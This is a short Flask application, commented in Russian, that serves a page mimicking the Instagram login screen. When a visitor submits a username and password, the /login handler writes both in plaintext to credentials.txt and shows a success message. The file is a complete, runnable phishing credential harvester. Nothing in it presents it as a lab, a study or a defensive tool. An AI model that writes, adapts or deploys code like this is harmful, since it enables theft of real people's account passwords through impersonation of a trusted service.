from flask import Flask, request, render_template_string

app = Flask(__name__)

# HTML-код страницы в переменной
html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #fafafa;
        }
        .login-container {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            width: 350px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .login-container h1 {
            font-family: 'Instagram', sans-serif;
            font-size: 2rem;
            color: #262626;
        }
        .input-field {
            margin: 10px 0;
            width: 100%;
        }
        .input-field input {
            width: 100%;
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
        }
        .login-button {
            margin-top: 20px;
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 3px;
            font-size: 14px;
            cursor: pointer;
        }
        .login-button:hover {
            background-color: #007dc1;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Instagram</h1>
        <form action="/login" method="post">
            <div class="input-field">
                <input type="text" name="username" placeholder="Username" required>
            </div>
            <div class="input-field">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-button">Log In</button>
        </form>
    </div>
</body>
</html>
"""

# Главная страница
@app.route('/')
def login_page():
    return render_template_string(html_template)

# Обработка данных формы
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')  # Получаем имя пользователя
    password = request.form.get('password')  # Получаем пароль

    # Сохраняем данные в файл
    with open('credentials.txt', 'a') as file:
        file.write(f"Username: {username}, Password: {password}\n")

    return "Данные успешно отправлены!"

if __name__ == "__main__":
    app.run(debug=True)